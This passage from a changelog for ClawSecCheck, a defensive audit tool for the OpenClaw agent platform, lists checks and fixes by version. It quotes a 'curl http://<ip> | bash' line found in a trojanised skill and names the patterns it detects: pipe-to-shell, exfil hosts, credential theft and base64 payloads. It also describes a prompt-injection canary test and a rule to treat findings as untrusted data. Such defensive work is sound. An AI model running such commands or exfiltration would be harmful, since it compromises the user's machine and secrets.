- **SKILL.md** now tells the agent to treat audit output as untrusted data (never follow
  instructions inside findings) and accurately states what files are read.

### Fixed
- **C3 (backups) was declared in the catalog but never run** — now registered, with a test that
  fails if any catalog entry is left unregistered.

## [0.5.0] — 2026-06-19

### Added
- **Installable CLI.** `pyproject.toml` (zero dependencies) exposes a `clawseccheck` console script
  and `python -m clawseccheck`, so it's `pipx install`-able as a standalone tool — not just the
  bundled skill. The CLI moved to `clawseccheck/cli.py`; `audit.py` is now a thin shim so the
  OpenClaw skill (`python3 {baseDir}/audit.py`) keeps working unchanged.
- **CI.** GitHub Actions runs the test suite + ruff on every push/PR.

## [0.4.0] — 2026-06-19

### Added
- **Baseline suppression (`.clawseccheckignore`).** Accept findings you've reviewed: list a check
  id (`B14`) or a finding fingerprint (`B14:ab12cd34`), one per line. Suppressed findings drop
  out of the score, the report, and monitor alerts. `--show-suppressed` lists them.
- **B17 — Autonomy / heartbeat actions.** Flags when the agent runs autonomously (a `HEARTBEAT.md`
  or schedule) so it can act without you — verify it can't be steered by untrusted input.
- **B18 — Subagent delegation.** Flags when subagents can be spawned and may inherit elevated/exec
  tools without human approval.
- **B19 — Data at-rest protection.** Flags group/world-readable memory/log directories and log
  files (conversation data / PII exposure). POSIX only.

### Fixed
- **Skill registration.** `SKILL.md` misused `requires.config` (a config *key* list) for a file
  path, so OpenClaw treated the requirement as unmet and `/clawseccheck` was not available as a
  command. Removed it — the skill now always registers and handles a missing config gracefully.
- **B3 over-strict.** A non-`minimal` `tools.profile` (e.g. `coding`) is a least-privilege
  preference, not a vulnerability — it is now a WARN, not a hard FAIL that capped the score.
  B3 fails only on genuine over-privilege (wildcard `allowFrom`, permissive reachability).

## [0.3.0] — 2026-06-19

### Added
- **Installed-skill / plugin vetting (B13).** Statically scans the *content* of skills you
  downloaded and installed (`~/.openclaw/skills`, `workspace/skills`, …) for the ClawHavoc
  malware class: pipe-to-shell from non-reputable hosts, paste/exfil hosts (glot.io,
  webhook.site, …), credential/wallet exfiltration, password-prompt social engineering, and
  **base64-obfuscated payloads** (decoded and re-scanned — never executed). Caught a real
  malicious `curl http://<ip> | bash` hidden in a trojanised skill during calibration.
- **Egress surface (B14, advisory).** Shows where the agent can reach out (channels,
  external-service skills, outbound tools) so you can see the exfiltration surface.
- **MCP server trust (B15).** Flags configured MCP servers for trust-boundary review
  (prompt injection / SSRF / data exposure); `UNKNOWN` when none are configured.
- **Version / update hygiene (C4, advisory).** Notes the OpenClaw version and reminds you to
  patch (ClawHavoc / CVE-2026-25253 target outdated installs).
- **Built-in audit merge.** ClawSecCheck now runs your own read-only `openclaw security audit
  --json` and folds its findings into the same report (`--no-native` to disable).
- **Threat-monitoring check (B16).** Verifies whether the user actually has monitoring /
  detection in place (a monitoring skill/plugin such as ClawSec or `openclaw-security-monitor`,
  or monitoring/alerts config); warns if an attack would otherwise go unnoticed.
- **Built-in monitor (`--monitor`).** Optional lightweight monitoring: scheduled re-audit +
  change detection — alerts on a new/modified installed skill, `SOUL.md` drift, a dropped score,
  or a check going PASS → FAIL. Keeps one snapshot at `~/.clawseccheck/state.json`. (Scheduled
  re-audit, not a real-time runtime IDS — that heavier model is intentionally out of scope.)
- **`--vet PATH`.** Vet a skill (folder or `SKILL.md`) with the B13 malware scan *before*
  installing it — verdict SAFE / SUSPICIOUS / DANGEROUS. Trust-before-install.
- **`--canary`.** Active prompt-injection self-test: a benign injection + unique token to feed
  the agent; if it echoes the token it's VULNERABLE, else RESISTANT (the live "battle-tested" check).
- **`--badge PATH`.** Write a shields-style SVG grade badge (grade + score only).
- **`--prompts`.** A copy-paste "ask your agent to fix it" prompt per finding.
- **`--save PATH`.** Optionally write the report to a file.

### Changed
- Renamed **ClawShield → ClawSecCheck** (the tool scans & reports, it does not "shield").
- High-precision tuning: `curl | sh` from reputable installer hosts (uv/rustup/brew/deno/…)
  is not flagged; credential-path mentions are only flagged when exfiltrated on the same line.

### Security
- Provenance: ClawSecCheck's own checks remain offline, read-only, zero-dependency. The only
  external command is your own `openclaw security audit --json` (fixed args, no shell, no
  `--fix`, with a timeout). The only optional write is `--save`.

## [0.2.0]

### Added
- Cross-platform support (Linux/macOS/Windows): pathlib paths, POSIX-permission checks
  skipped on Windows (NTFS ACLs), and an ASCII output fallback (`--ascii` + auto-detect).

## [0.1.0]

### Added
- Initial prototype: passive, read-only OpenClaw config + bootstrap-file audit.
- Lethal Trifecta correlation (A1) and hardening checks (B1–B12).
- Deterministic A–F score with honesty hard-caps and a shareable badge (grade only).
- Bootstrap-file injection scanning (B6) — a gap the native audit does not cover.

## [Unreleased]

### Added
- Documented a formal pre-release protocol for `ruff`/test validation and mandatory documentation synchronization before every release.

### Changed
- Added explicit checklist references for keeping release artifacts aligned across `README.md`, `CHANGELOG.md`, `SECURITY.md`, `SECURITY_MODEL.md`, `SKILL.md`, and `SKILL_HE.md`.
